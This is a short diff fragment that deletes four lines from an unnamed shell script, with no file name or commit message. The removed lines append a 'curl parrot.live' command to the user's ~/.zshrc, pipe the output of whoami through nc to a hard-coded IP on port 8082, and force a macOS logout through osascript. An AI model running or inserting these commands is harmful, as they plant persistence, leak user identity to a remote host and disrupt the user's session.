@@ -1,4 +1,0 @@
-domain=10.19.210.229
-echo 'curl parrot.live' >> ~/.zshrc
-whoami | nc "$domain" 8082
-osascript -e 'tell application "System Events" to log out'
